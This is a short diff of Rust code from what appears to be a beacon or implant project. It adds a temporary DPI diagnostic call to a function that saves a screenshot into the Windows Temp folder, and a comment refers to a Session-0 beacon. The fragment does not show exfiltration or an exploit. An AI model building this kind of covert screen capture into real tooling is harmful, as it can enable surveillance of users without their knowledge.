@@ -450,6 +450,8 @@ pub unsafe extern "system" fn nyx_beacon_oneshot() {
 #[no_mangle]
 pub unsafe extern "system" fn nyx_screenshot_session() {
     let path = b"C:\\Windows\\Temp\\nyx_shot.bmp\0";
+    // TEMP: DPI virtualization probe (see screenshot::dpi_probe_diag).
+    unsafe { crate::screenshot::dpi_probe_diag() };
     // Propagate capture success/failure into the exit code so the Session-0
     // beacon can distinguish a helper that genuinely produced a BMP (exit 0)
     // from one that failed to write (exit 1). The old code discarded the bool
